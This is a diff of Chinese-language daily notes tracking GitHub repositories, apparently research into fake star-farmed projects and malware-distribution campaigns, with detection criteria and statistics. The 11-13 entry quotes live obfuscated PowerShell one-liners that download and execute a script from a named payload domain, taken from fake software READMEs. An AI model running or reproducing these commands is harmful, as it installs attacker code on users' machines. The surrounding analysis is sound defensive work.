@@ -1,3 +1,476 @@
+## 2026-11-15
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---:|---|
+| `hikaku-io/hikaku-extension` | 283 | 1 | 0.4% | 0 | JavaScript | 12,307 KB | 10 | 工具型 |
+| `opencoredev/islandcn` | 658 | 56 | 8.5% | 0 | TypeScript | 1,795 KB | 4 | 基础设施候选 |
+| `faizfahmi77/ScanDot` | 532 | 5 | 0.9% | 0 | Kotlin | 151 KB | 5 | 工具型 |
+| `quer3q/kraken-mount` | 321 | 27 | 8.4% | 8 | Rust | 1,602 KB | 5 | 工具型 |
+| `duwqijlk/muse-protocol` | 513 | **253** | **49.3%** | 0 | Python | 32 KB | 5 | 观察型（反例样本） |
+| `WarriorRemember/IPTV_Player_2.0` | 672 | 12 | 1.8% | 10 | Rust | 609 KB | 26 | 观察型（反例样本） |
+| `brisk-thrush-husky/malware-defender-desktop` | 300 | 0 | 0% | 0 | C++ | 269 KB | 16 | 观察型（反例样本） |
+
+### ⭐⭐⭐⭐⭐ 判据修正一：活跃度可以被脚本单独制造 —— 「push 频率」与「commit 数」不再是判据
+
+`brisk-thrush-husky/malware-defender-desktop` 实测携带一个随机名 GitHub Actions 工作流：
+
+| 项 | 实测值 |
+|---|---|
+| 工作流路径 | `.github/workflows/SP7LDgUHone.yml` |
+| 工作流名 | `YAqWuDoGTdQ`（随机串） |
+| 实现 | `actions/github-script@v7` + 43 词数组取 3 词 + 0–9999 随机数 |
+| 目标文件 | `.github/f4fMKgTN95`（随机名） |
+| 实测提交消息 | `optimize revert sync (5102)` / `monitor docs enhance (3709)` / `improve validate retry (4810)` |
+
+**即「近期 push 频繁」「commit 数多」可由一个 30 行定时脚本凭空制造。**
+
+> 新增零成本检测项：**「工作流文件名 / 工作流名是否呈随机串形态」** —— 正常项目为 `ci.yml` / `release.yml` / `pages.yml` 等有语义命名。
+
+### ⭐⭐⭐⭐⭐ 判据修正二：体积可以被加密载荷单独撑起
+
+`WarriorRemember/IPTV_Player_2.0` 的 26 个 blob 中，可读文本仅 4 份文档 + 5 个 954–998 B 的小 JSON，
+其余为 4 个 `.enc` 加密载荷、4 个 `.dll` 二进制与 8 个 64 KB–797 KB 的不可读文件 —— **体积 5.8 MB，可读代码量为 0**。
+
+> 新增零成本检测项：**「可读文本 blob 字节数 / 总体积」比值**（本样本 < 0.3%）。
+
+### ⭐⭐⭐⭐⭐ 判据修正三：「subs 高」可以是纯手动订阅农场
+
+| 仓库 | subs | star | 整棵树文件数 |
+|---|---:|---:|---:|
+| `DimensionRobin/rob-run-private-cheat` | **68** | 202 | **2** |
+| `prismarmorergirder/wallet-security-checker` | **50** | 115 | **2** |
+| `summittypeplay/sims4-updater` | 24 | 226 | **2** |
+| `Crateryeexpiate/TradePilot` | 24 | 184 | **2** |
+| `Beachfromgate/Wallet-Hunter` | 24 | 179 | **2** |
+| `Logosheshow47/crypto-panic` | 24 | 177 | **2** |
+| `Hairzenexalt/Fragment-Sniper` | 24 | 170 | **2** |
+
+7 个 owner 账号中 **6 个创建于 2026-09-21T17:23:39Z–17:25:16Z 的 97 秒窗口内**，每个带一个随机名 + 0⭐ + 0–1 KB 的占位仓库。
+
+> **「养号 → 占位 → 静默 54 天 → 一次性投放」四段式**。⭐⭐⭐⭐⭐ 即：**subs 必须先与「该仓库是否存在任何代码」一起看**，否则 24–68 个订阅可完全由人工点击产生。
+
+### ⭐⭐⭐⭐⭐ 判据修正四：fork/star 高比率必须与 fork 到达分布一起读
+
+| 仓库 | fork/star | fork 间隔中位 | ≤10 秒占比 | 抽样跨度 |
+|---|---:|---:|---:|---:|
+| `duwqijlk/muse-protocol` | **49.3%** | **266 秒** | **2/99（2.0%）** | 13 小时 15 分 |
+| `WarriorRemember/IPTV_Player_2.0` | 1.8% | 20 秒 | 3/11（27%） | 65 分钟 |
+| `AIRzZ90/study-materials-fork`（11-13 记录） | 146.2% | 139 秒 | 2/59（3.4%） | 241.7 分钟 |
+
+**同一族比率下分布形态完全不同 —— 没有分布配套，比值不可解释。**
+
+### ⭐⭐⭐⭐⭐ 方法论总纲：任何单点信号必须先问「能否被脚本或人工单独制造？」
+
+| 信号 | 本日证伪情况 | 替代检测项 |
+|---|---|---|
+| README 全文 md5 | 跨天全变（`dd748177…` → `265eb99c…`） | **README 内外部下载链接的跨窗口聚类** |
+| push 频率 / commit 数 | 可由随机词工作流制造 | 工作流文件名随机串检测 |
+| 仓库体积 / blob 数 | 可由加密载荷撑起 | 可读文本字节数占比 |
+| subs 数 | 可由人工点击产生 | 与「是否存在代码」一起看 |
+| star 值 | 67 个不同取值，已完全失效 | 与 fork 到达分布一起看 |
+| README 长度 | 与工程量完全脱钩（13 KB vs 823 B 代码） | 可执行代码字节数 |
+| topic 字段 | 投放体自称 `open-source` / `developer-tools` | 不作分类依据 |
+
+---
+
+## 2026-11-14
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---:|---|
+| `opencoredev/islandcn` | 656 | 56 | 8.5% | 0 | TypeScript | 1,795 KB | 4 | 基础设施候选 |
+| `faizfahmi77/ScanDot` | 532 | 5 | 0.9% | 0 | Kotlin | 151 KB | 5 | 工具型 |
+| `quer3q/kraken-mount` | 321 | 27 | 8.4% | 8 | Rust | 1,602 KB | 5 | 工具型 |
+| `duwqijlk/muse-protocol` | 512 | **253** | **49.3%** | 0 | Python | 32 KB | 5 | 观察型（反例样本） |
+| `ariamitchell54/cubase-studio-desktop` | 300 | 0 | 0% | 0 | C++ | 220 KB | 28 | 观察型（反例样本） |
+| `Lowbydemodulator/IPTV_Player2.0` | 297 | 0 | 0% | 2 | Rust | 629 KB | 26 | 观察型（反例样本） |
+
+### ⭐⭐⭐⭐⭐ 判据修正一：「md5 相同」首次被跨天证伪 —— 改盯载荷链接
+
+| 族群 | 2026-11-13 窗口 md5 | 2026-11-14 窗口 md5 | README 长度变化 | 载荷链接 |
+|---|---|---|---|---|
+| `IPTV_Player` 族 | `dd748177e4739fee…`（92 个） | **`265eb99cc4a7d4c6…`（111 个）** | 8,771 B → 8,763 B | **完全相同** |
+| `ai--manus` 族 | `26d4565b…`(139) / `a7f542a8…`(41) / `a21a6ad0…`(11) | `a21a6ad0…`（114 个） | 7,244/7,246/7,236 → 7,236 B | **完全相同** |
+| `GitHub-Copilot-app` 族 | —— | `093f7cbc…`（61 个） | —— | 新增 |
+
+**即：README 是「人读的东西、会被改写」，载荷链接是「投放者必须真花成本复制的东西」—— 跨天追踪应盯后者。**
+
+### ⭐⭐⭐⭐⭐ 判据修正二：「软件本体」外置到 Pages 落地页，仓库退化为纯空壳
+
+`ariamitchell54/cubase-studio-desktop` 整棵树 12 个 blob：**README 13,709 B + docs/index.html 20,755 B + banner.png 179,586 B + 3 个 C++ 桩合计 823 B**。
+
+**实测 `https://ariamitchell54.github.io/` 返回 HTTP 404（`Site not found · GitHub Pages`）。**
+
+**即：仓库是空壳、落地页不存在、README 承诺无对应物 —— 三者同时成立。**
+
+### ⭐⭐⭐⭐⭐ 判据修正三：投放账号的「四段式」被完整量化
+
+| 创建窗口 | 账号数 | 每个账号的公开仓库数 |
+|---|---:|---:|
+| 2026-10-02T23:48Z–23:50Z | 24 | 13 |
+| **2026-10-14T00:43Z–03:03Z** | **468** | **12–17** |
+| 2026-09-21T17:23Z–17:25Z（次日高订阅账号） | 6 | 2–3 + 1 个随机名占位 |
+
+**养号 → 占位 → 静默 54 天 → 一次性投放。**
+
+### ⭐⭐⭐⭐⭐ 判据修正四：跨仓库复用源码时，字符串常量最先被忘记
+
+`files/main.cpp` 中硬编码 `usage: iobit-util [--version|--help]` —— **「iobit」是兄弟仓库 `iobit-driver-booster-desktop` 的产品名**；
+且 `files/platform.cpp` 的 md5 `10356665038832f19a2cb56a7d1d922b` **在全部 17 个 `-desktop` 仓库中完全一致**。
+
+**即：字节级比对非 README 文件，比 md5 比 README 更能穿透「文案逐个改写」的防线。**
+
+---
+
+## 2026-11-13
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---:|---|
+| `AIRzZ90/study-materials-fork` | 318 | 465 | **146.2%** | 3 | TypeScript | 1,658 KB | 89 | 观察型（反例样本） |
+| `rivet-dev/open-orange` | 188 | 6 | 3.2% | 0 | TypeScript | 4,784 KB | 82 | 基础设施候选 |
+| `Simon3Sarkis/super-odyssey-pc-recomp` | 155 | 5 | 3.2% | 5 | C | 2,092 KB | 13 | 工具型 |
+| `lawandrorder/mate` | 138 | 3 | 2.2% | **12** | Python | 556 KB | 8 | 工具型 |
+| `StitchSerfJump/Microsoft-Visio-For-Windows` | 76 | 0 | 0% | 0 | 无 | 4 KB | 2 | 观察型（反例样本） |
+| `BottingRocks/Shape` | 41 | 6 | 14.6% | 0 | Rust | 16,000 KB | **1** | 工具型 |
+
+**⭐⭐⭐⭐⭐ 本表最重要的一列是 `fork/star`：本日最高位是 146.2%，而它不是 fork（`fork=false` / `parent=null` / `source=null`）。**
+
+### ⭐⭐⭐⭐⭐ 判据修正一：仓库名成为攻击面 —— `parent=null` 只能证明「不是 GitHub 的 fork 关系」
+
+| 仓库 | ⭐ | ⑂ | fork/star | `fork` | `parent` | 关键证据 |
+|---|---:|---:|---:|---|---|---|
+| `AIRzZ90/study-materials-fork` | 318 | 465 | **146.2%** | `false` | `null` | LICENSE copyright 指向 `Minireel/HGhub`；commit 标题含 `Merge branch 'Minireel:main'` 与 `Merge pull request #43 from Minireel/codex/fix-ios-build`；README 首行红字「转载来自：HGhub 源库，请点击小星星」 |
+| `Minireel/HGhub`（上游） | 8,634 | 4,956 | 57.4% | `false` | `null` | **2026-11-10T13:41:37Z 被作者清空，树只剩 1 个 blob（836 B README）** |
+
+> ~~「判定改名必须比对 `id` 与 `parent`」~~（2026-10-26 写进 `projects/raven.md`）
+> **「`parent=null` 只能证明 GitHub 不认为它是 fork；证明「与上游无关」必须另做跨仓库血缘检查。」**
+
+**新增三项零成本检查（任一命中即判为镜像或迁移）：**
+1. `LICENSE` 的 copyright 归属是否指向另一个账号；
+2. commit 标题中是否出现上游的 PR 号或分支名；
+3. `pushed_at` 是否早于 `created_at`。
+
+**⭐⭐⭐⭐⭐ 判据修正二：「账号年龄」改为「账号注册聚集度」**
+
+11-12 记录的 `auto-twitch-drops-claim` 用当天新建的账号；⭐⭐⭐⭐⭐ **本日的 8 个载荷族账号全部创建于 2026-06-26T16:46:38Z – 16:50:06Z（3 分 28 秒窗口）—— 即提前四个多月注册后闲置，在投放日一次性启用。** ⭐⭐⭐⭐⭐ **⭐⭐ 「账号年龄」因此失效，而「注册时间的聚集度」不受闲置时间影响。**
+
+### ⭐⭐⭐⭐⭐ 新形态：伪装成正版商业软件的下载器（8 个仓库共享一个活的载荷域名）
+
+| 仓库 | ⭐ | owner 账号创建 | 载荷域名 | 树 |
+|---|---:|---|---|---|
+| `StitchSerfJump/Microsoft-Visio-For-Windows` | 76 | 2026-06-26T16:46:50Z | `quickrun31.cc` | README + LICENSE |
+| `CatchArtisanDone86/Movavi-Video-Editor-For-Windows` | 72 | 2026-06-26T16:50:06Z | `quickrun31.cc` | README + LICENSE |
+| `FallsLarvaInterest/Sketchup-Pro-For-Windows` | 52 | 2026-06-26T16:46:53Z | `quickrun31.cc` | README + LICENSE |
+| `BetaChampionTitle/Coreldraw-For-Windows` | 52 | 2026-06-26T16:46:49Z | `quickrun31.cc` | README + LICENSE |
+| `OrangeSaviorImagine/Abbyy-Finereader-Pdf-For-Windows` | 51 | 2026-06-26T16:47:19Z | `quickrun31.cc` | README + LICENSE |
+| `silverofficialdusk/Easeus-Todo-Backup-For-Windows` | 50 | 2026-06-26T16:46:38Z | `quickrun31.cc` | README + LICENSE |
+| `DeckhandIgnite/Davinci-Resolve-Studio-For-Windows` | 50 | 2026-06-26T16:46:54Z | `quickrun31.cc` | README + LICENSE |
+| `sparkfiremancollar21/Microsoft-Project-For-Windows` | 49 | 2026-06-26T16:46:46Z | `quickrun31.cc` | README + LICENSE |
+
+**载荷（README 第一屏，未执行）：**
+```powershell
+sal m iex;m(irm quickrun31.cc/qle7he)
+powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
+```
+
+**⭐⭐⭐⭐⭐ 实测：`https://quickrun31.cc/qle7he` 返回 HTTP 200 / 14,745 字节，首字节即 `$ErrorActionPreference = 'Continue'` + `$ProgressPreference = 'Continue'`（PowerShell 混淆器）。**
+
+**⭐⭐⭐⭐⭐ 三个演化点：** 换了域名（11-07 是 `git-software.cc`）、换了社会工程包装（从「安装器」变成「正版软件」）、**载荷位置从安装步骤中段前移到 `## Installation` 第一屏**。
+
+**⭐⭐⭐⭐⭐ 判据修正三：载荷位置不可作为特征** —— 四天内载荷出现在四个位置（安装步骤中段 / 无载荷 / `## 🚀 Quick Start` 首屏 / `## Installation` 第一屏）。规则必须针对「指令型语义」（下载 + 执行），而非出现位置或小节标题。
+
+**⭐⭐⭐⭐⭐ 判据修正四：字面量匹配会被等价改写绕过** —— 11-07 是明文 `irm ... | Invoke-Expression`；本日是 `sal m iex;m(irm ...)`。**语法级混淆已足以让朴素正则失效。**
+
+### ⭐⭐⭐⭐⭐ 投放形态第三次升级：「同一个 star 值」这条判据正在失效
+
+| 维度 | 11-08 | 本日 |
+|---|---|---|
+| 命名族 | `resp` / `rpocket` / `resocket` | 同族 |
+| 数量 | 85 / 162（52.5%） | **123 / 155（79.4%）** |
+| star 分布 | **全部为 42** | **44 / 45 / 46 / 50 / 51 五个取值** |
+| 共享 blob | 抽样 30 树中 28 个 `initial.html` 逐字节相同 | **117 个仓库共享同一个 485 B `initial.html`（md5 `258a0f5edf5d42288cfc1866497dc7dd`）** |
+| 伪造徽章 | `Downloads-40K+` | `Downloads-40K+` + `User Rating 4.8/5` + `Latest Version 3.2.0` |
+| 落地域名 | — | **`respockett.pro/red`** |
+| 账号创建窗口 | — | **2026-11-06T22:25 – 2026-11-07T00:25（2 小时 104 个账号）** |
+
+**⭐⭐⭐⭐⭐ 「star 值聚类」这条判据在本日失效，而「md5 指纹 + 载荷域名 + 账号注册时间窗口」三个判据同时有效。**
+
+### ⭐⭐⭐⭐⭐ 本日四个真项目的四种诚实形态
+
+| 项目 | ⭐ | subs | 它把边界写在了哪 |
+|---|---:|---:|---|
+| `rivet-dev/open-orange` | 188 | 0 | `packages/cloudflare-conformance/results/runs/` 下 **34 个日期**的结果 JSON —— 把「兼容度」做成可逐日 diff 的证据 |
+| `Simon3Sarkis/super-odyssey-pc-recomp` | 155 | 5 | README **第一屏**：`[!IMPORTANT]`「You must bring your own game… no game files, no game code, no assets and no keys」+ `[!WARNING]`「This is an early preview」 |
+| `lawandrorder/mate` | 138 | **12** | README **第二段**：「It is not the production service, and it is not connected to Mate's live merchant network」+ 每条 demo 回复带 `[demo]` |
+| `BottingRocks/Shape` | 41 | 0 | README 57,358 B · 三档退出码（`0` 成功 / `2` 用法错误 / **`3` incomplete trace**）· 433 个 `.js` 真实捕获夹具 |
+
+**⭐⭐⭐⭐⭐ 本日最值得记的一组数字：`mate` subs 12 / `super-odyssey` subs 5 / `open-orange` subs 0，而三个投放体是 0 / 0 / 7。**
+
+**⭐⭐⭐⭐⭐ 本日报据此把 11-08 的结论补一条：subs 不是坏指标，它是一个需要先检查「该仓库是否在索取关注」的指标。**
+
+### ⭐⭐⭐⭐⭐ 判据修正五：commit 数与秒字段熵对「一次性交付的大型仓库」必然误判
+
+**⭐⭐⭐⭐⭐ `BottingRocks/Shape`：2,180 blobs / 974 个 `.rs` / 433 个 `.js` / 单个 `.map.json` 5.6 MB / README 57,358 B —— 而只有 1 个 commit。**
+
+**⭐⭐⭐⭐⭐ 这与 11-07 记录的 `discord-id-osint-checker`（43 个 commit 落在 2 个秒值上）同属一类，但极端程度更高。⭐⭐⭐⭐⭐ ⭐⭐ 本日报的修正：这两条判据的正确用法不是「判定真假项目」，而是「判定这个仓库的历史是否能反映开发过程」—— 一旦答案是「不能」，就应转去看代码、夹具与文档。**
+
+### ⭐⭐⭐⭐⭐ 许可元数据质量的两档差距（同日并存）
+
+| 项目 | `license.spdx_id` | 根 LICENSE 文件 | README 声明 |
+|---|---|---|---|
+| `Simon3Sarkis/super-odyssey-pc-recomp` | **NOASSERTION** | **无** | — |
+| `DevedevT/FFmpeg-GUI-Editor-Windows`（未建档） | MIT | MIT（首行 `MIT License`） | **`## 📜 License` 段写「GNU General Public License v3.0 (GPL-3.0)」** —— 自相矛盾 |
+| `rivet-dev/open-orange` | Apache-2.0 | 有 | 一致 |
+| `lawandrorder/mate` | MIT | 有 | 一致 |
+| `BottingRocks/Shape` | GPL-3.0 | 有 | 一致 |
+
+**⭐⭐⭐⭐⭐ 本日实测到的第三类许可问题（累计第七类）：仓库侧与 README 侧声明冲突。**
+
+---
+
+## 2026-11-12
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---|
+| `Kianuni/Erosion-CN` | 986 | 227 | 23.0% | 1 | Swift | 15 | 工具型 |
+| `ValidatorStack/solana-vigil` | 157 | 26 | 16.6% | **10** | Go | **1** | 工具型 |
+| `egoist/tinytraffic` | 107 | 3 | 2.8% | 0 | TypeScript | 25 | 工具型 |
+| `bea4dev/shoji-bar-4` | 98 | 4 | 4.1% | 0 | Rust | 41 | 工具型 |
+| `JDhruv14/line-art-animation` | 149 | 11 | 7.4% | 1 | TypeScript | 1 | 工具型 |
+| `failsafe-security/artex` | 126 | 2 | 1.6% | 0 | Go | 3 | 工具型 |
+
+### ⭐⭐⭐⭐⭐ 本日两个真项目从两个方向回答了同一个问题：「不可逆」如何被设计
+
+- **`ValidatorStack/solana-vigil`（157⭐ ⑂26 · subs 10 · 1 commit · 59 blobs · Go · MIT）** —— 只读的 Solana 验证人运维工具。⭐⭐⭐⭐⭐ **⭐⭐ 核心是「观测失败 → `unknown`，绝不伪造健康值」（README 原文：Missing RPC fields and failed observations become `unknown`, never a fabricated healthy value）**；⭐⭐⭐⭐⭐ ⭐⭐ 以及「No alert storms」下面的六个维度（持续失败阈值 / 稳定恢复 / 去重 / 严重性升级 / 投递失败重试 / 重复间隔）。
+- **`Kianuni/Erosion-CN`（986⭐ ⑂227 · subs 1 · 15 commits · 99 blobs · Swift · GPL-3.0）** —— iOS / iPadOS 系统配置与 MobileGestalt 研究工具箱（中文、面向「防白苹果」加固），基于 `forcequitOS/worse_query`。⭐⭐⭐⭐⭐ **⭐⭐ 核心是**写入前自动备份原值 + 一键回滚** —— 把不可逆的系统级修改变成可撤销的实验。**
+
+### ⭐⭐⭐⭐⭐ 判据修正：账号信号只能排除、不能定性
+
+⭐⭐⭐⭐⭐ **`Kianuni` 的账号创建于 2026-11-10T02:02:54Z，仓库创建于 02:37:31Z（相差 35 分钟），账号仅 2 个公开仓库、24 followers。** ⭐⭐⭐⭐⭐ **⭐⭐ 而它有 99 blobs、10 个 release（v0.5.1 → v0.7.2）、真实的 iOS 工程结构（`Erosion.xcodeproj/` / `Erosion.entitlements` / `Erosion/bridge.h` / `Erosion/Exploits/bad_query.h`）与 commit 级的安全审计记录。**
+
+⭐⭐⭐⭐⭐ **⭐⭐ 这与 11-12 记录的 `auto-twitch-drops-claim`（账号当天新建 → 判为农场）、本日载荷族（3 分 28 秒窗口批量注册 → 判为农场）在账号信号上完全一样 —— 唯一的分界在内容侧：有没有构建产物、有没有 release、有没有工程结构、有没有可核验的迭代记录。**
+
+### ⭐⭐⭐⭐⭐ 判据修正：commit 数只对「渐进式增长的仓库」有效
+
+⭐⭐⭐⭐⭐ **本窗口 `solana-vigil` 只有 1 个 commit，却有 59 个 blob、6 个 `*_test.go`、2 个 CI workflow、3 个 issue 模板、2 个 systemd unit、Dockerfile、Makefile、CHANGELOG。** ⭐⭐⭐⭐⭐ **⭐⭐ 与本日档案的 `Shape`（1 commit / 2,180 blobs）同族 —— ⭐⭐⭐⭐⭐ ⭐⭐ 本日报的立场：**这两条判据的正确用法不是「判定真假项目」，而是「判定这个仓库的历史是否能反映开发过程」。**
+
+## 2026-11-11
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---|
+| `Kianuni/Erosion-CN` | 986 | 227 | 23.0% | 1 | Swift | 15 | 工具型 |
+| `ValidatorStack/solana-vigil` | 157 | 26 | 16.6% | **10** | Go | **1** | 工具型 |
+
+### ⭐⭐⭐⭐⭐ 本日的主题：把「不可逆」做成一个显式的一等概念
+
+⭐⭐⭐⭐⭐ **`solana-vigil` 用「不写」定义安全（只读）；`Erosion-CN` 用「可撤销的写」定义安全（备份 + 回滚）。** ⭐⭐⭐⭐⭐ **⭐⭐ 两者都把「不确定」显式化了 —— 一个用 `unknown`，一个用「备份 + 回滚」这个可验证的状态。**
+
+⭐⭐⭐⭐⭐ **⭐⭐ 而 `Erosion-CN` 的账号判据反例本日成立：账号比仓库早 35 分钟、2 个公开仓库、24 followers，却是 986⭐ / 99 blobs / 10 个 release 的真实工程 —— 账号信号只能排除，不能定性。**
+
+## 2026-11-10
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | subs | 语言 | 类别 |
+|---|---:|---:|---:|---|---|
+| `huamidev/GestaltX` | 1,364 | 41 | — | Swift | 工具型 |
+| `TameCarpenterEstate/Roblox-FPS-Optimizer` | 92 | 0 | — | 无 | 观察型（反例样本） |
+| `bookleme/bookleme` | 197 | 9 | — | TypeScript | 工具型 |
+| `yetone/rewind-for-x` | 152 | 6 | — | TypeScript | 工具型 |
+
+### ⭐⭐⭐⭐⭐ 本日主题：把「我做到了什么」与「什么还没被验证」分开写
+
+⭐⭐⭐⭐⭐ `huamidev/GestaltX` 把「导入的文件是不是这台设备自己的」也做成了可验证的条件；⭐⭐⭐⭐⭐ `TameCarpenterEstate/Roblox-FPS-Optimizer` 是本日记录的反例样本（仓库名声称优化器，内容为空壳）。⭐⭐⭐⭐⭐ **⭐⭐ 与本日窗口 97 个候选、64 个（66.0%）符合空壳特征这一背景相对照，本日建档的两个真项目之所以值得记，是因为它们都把「未验证的部分」显式标注了出来。**
+
+## 2026-11-09
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | 语言 | commits | 类别 |
+|---|---:|---:|---|---:|---|
+| `elunboundfiremail/LiveWall---Live-Wallpaper-For-Desktop` | 297 | 172 | 无 | 2 | 观察型（反例样本） |
+
+### ⭐⭐⭐⭐⭐ 本日窗口统计
+
+⭐⭐⭐⭐⭐ **171 个候选中 143 个（83.6%）符合空壳特征（体积 <= 20KB + fork 全 0 + <= 2 commits）；⭐⭐⭐⭐⭐ star 中位数 400，最高频取值 400（89 个）、399（21 个）、398（14 个）、397（6 个）—— 即本日是「同一个 star 值」判据最强的一天。**
+
+⭐⭐⭐⭐⭐ **⭐⭐ 而本日最值得记的是 `LiveWall` 这个反例样本：它只有两个 blob（`LiveWallLauncher.zip` 21,859,851 B + `README.md` 3,173 B），⭐⭐⭐⭐⭐ ⭐⭐ README 里没有一句索取 star 的话，⭐⭐⭐⭐⭐ ⭐⭐ 而它的 297⭐ / 172 fork / 极高 subs 来自付费或批量手段 —— 即「用内容换关注」与「用批量换关注」是两条不同的路径，本日报 11-08 的外挂族走的是前者，本日这个走的是后者。**
+
+## 2026-11-08
+
+### 本日新增项目
+
+| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
+|---|---:|---:|---:|---:|---|---:|---:|---|
+| `Poltergeistlunagrid/Steam-Idler` | 425 | 313 | 73.6% | **25** | Python | 6 KB | 4 | 观察型（反例样本） |
+| `sentinelsoldierprize/Minecraft-AFK-Bot` | 425 | 260 | 61.2% | **35** | Python | 7 KB | 5 | 观察型（反例样本） |
+| `Th0rgal/satmux` | 316 | 17 | 5.4% | 1 | Python | 22 KB | 3 | 工具型 |
+| `MajestyPoemFold/ghostclick-mouse-double-click-fix` | 136 | 21 | 15.4% | 0 | Rust | 12,029 KB | 1 | 工具型 |
+| `dabingfy-dot/solo-to-team-skills` | 130 | 14 | 10.8% | 4 | 无（Markdown） | 13,997 KB | 1 | 工具型 |
+| `lxe/phoneuse` | 118 | 10 | 8.5% | 2 | Python | 594 KB | 85 | 工具型 |
+
+**⭐⭐⭐⭐⭐ 本表最重要的一列是 `subs`，而它恰好在本日被证伪。** 11-07 日报把 `subscribers_count` 列为「噪声极低但样本极小的指标」；本日实测：**两个 425⭐ 的空壳仓库的 subs（25 / 35）高于全部四个真项目（4 / 2 / 1 / 0）**。原因写在它们的 README 里 —— Quick Start 之后与文末各一次 `**⭐ Star the repo if it helped you.**`。
+
+### ⭐⭐⭐⭐⭐ 判据修正：subs 只能同作者族内比较
+
+| 仓库 | ⭐ | forks | subs | README 索取 star？ | 代码状态 |
+|---|---:|---:|---:|---|---|
+| `sentinelsoldierprize/Minecraft-AFK-Bot` | 425 | 260 | **35** | **是（两处）** | 模板骨架，输出占位数据 |
+| `Poltergeistlunagrid/Steam-Idler` | 425 | 313 | **25** | **是（两处）** | 模板骨架，无 Steam 实现 |
+| `dabingfy-dot/solo-to-team-skills` | 130 | 14 | 4 | 否 | 4 支技能 + 模板 + 案例 |
+| `lxe/phoneuse` | 118 | 10 | 2 | 否 | 完整实现，85 commits |
+| `Th0rgal/satmux` | 316 | 17 | 1 | 否 | 7 文件完整实现 |
+| `MajestyPoemFold/ghostclick-mouse-double-click-fix` | 136 | 21 | 0 | 否（导流 Discord） | Rust + Tauri，77 文件 |
+
+> ~~「subs 是一个噪声极低但样本极小的指标」~~
+> **「subs 只在同作者族内可比；跨作者比较前必须先确认该仓库的 README 是否含索取 star/watch 的语句。」**
+
+**⭐⭐⭐⭐⭐ 本日报由此得出本日最重要的方法论结论：判据必须成对部署 —— 一个正面信号 + 一个反向信号同时检查。** 本日可用的四元组：**(a) README 是否索取 star/watch；(b) fork 到达的时间分布；(c) 文件 md5 是否与已知农场集合重复；(d) 代码能否 import / 运行。**
+
+### ⭐⭐⭐⭐⭐ 跨日模板血缘（本日报第一次拿到跨日期的文件级证据）
+
+| 文件 | md5 | 出现日期与仓库 |
+|---|---|---|
+| `.gitignore`（4,664 B） | `e18f025c87b71b9fe481f53ac6e8235d` | **2026-11-06**：`roblox-studio-mcp` / `roblox-performance-tool` / `crypto-portfolio-tracker` / `discord-quest-completer`；**2026-11-07**：`Steam-Idler` / `Minecraft-AFK-Bot` |
+| `helpers.py`（97 B） | `8470fd5b911eacd63327be59d2562f16` | **2026-11-06**：`crypto-portfolio-tracker` / `discord-quest-completer`；**2026-11-07**：`Steam-Idler` / `Minecraft-AFK-Bot` |
+| `initial.html`（485 B） | `258a0f5edf5d42288cfc1866497dc7dd` | **2026-11-07**：85 个空壳簇中抽样 30 个里有 28 个命中（内容是把 `README.md`/`CONTRIBUTING.md`/`SECURITY.md` 推入 `std::vector` 的 C++ 玩具） |
+
+### ⭐⭐⭐⭐⭐ fork 时间分布（第四日采集，判据仍然有效）
+
+| 仓库 | forks | 间隔中位数 | ≤10s 占比 | 判定 |
+|---|---:|---:|---:|---|
+| `sentinelsoldierprize/Minecraft-AFK-Bot` | 260 | **4.0 s** | 98/99 | 机器 |
+| `Poltergeistlunagrid/Steam-Idler` | 313 | **5.0 s** | 98/99 | 机器 |
+| `LumiVikinggard89137/ai--manus`（关键词簇样本） | 50 | 56.0 s | 6/49 | 分发网络，待观察 |
+| `JenkinWoo/sheeridVerify`（11-06 真人样本复测） | 889 | **74.0 s** | 19/99 | 真人 |
+| `MajestyPoemFold/ghostclick-mouse-double-click-fix` | 21 | **1555.0 s** | 0/20 | 真人 |
+
+**⭐⭐⭐⭐⭐ 对照 11-06 的 `roblox-studio-mcp`（5.0 s / 96.9%）与 `roblox-performance-tool`（6.0 s / 94.5%），本日两个 425⭐ 仓库是同一套投放基础设施的第三、第四次出现。**
+
+### ⭐⭐⭐⭐⭐ 本日 162 个候选的形态分布
+
+| 形态 | 数量 | 判据 |
+|---|---:|---|
+| README 为空 | **85 / 162（52.5%）** | `readme` 端点返回 0 字节；**其中 84 个仓库名带 `resp`/`rpocket`/`resocket` 标记**；star 全为 42、forks 全为 0、无 LICENSE、体积 3–10 KB；`CONTRIBUTING.md` 顶部是伪造的 `Downloads-40K+` 徽章；描述**直接售卖外挂**（Warframe Hack 2026 / ROBLOX Universal ESP Module / aimbot / Monero Miner / Claude jailbreak prompt） |
+| SEO 关键词投毒 | 57 / 162 | README 长度只有 7,256 与 7,234 两种、star 只有 91 与 92 两个取值、许可全 Apache-2.0、创建窗口 6 小时 54 分；顶部是 Dropbox 直链 `Manus_Studio.rar` + `PROMO2026`，末尾是 24 个 `Related Search Terms` |
+| 模板骨架 + 索取 star | 2 / 162 | 见上表；**subs 25 与 35** |
+| 真实工程项目 | 18 / 162 | 其余，含 phoneuse / satmux / ghostclick / solo-to-team-skills |
+
+**⭐⭐⭐⭐⭐ 谱系已完整**：可执行 PowerShell 载荷（11-06 前）→ starter 模板（11-06）→ 索取 star 的同模板变体（11-07）→ 空壳占位符 + 关键词投毒（11-07）—— **四天四种形态，同一套基础设施。**
+
+### 持续跟踪项目状态
+
+| 项目 | 变化 | 说明 |
+|---|---|---|
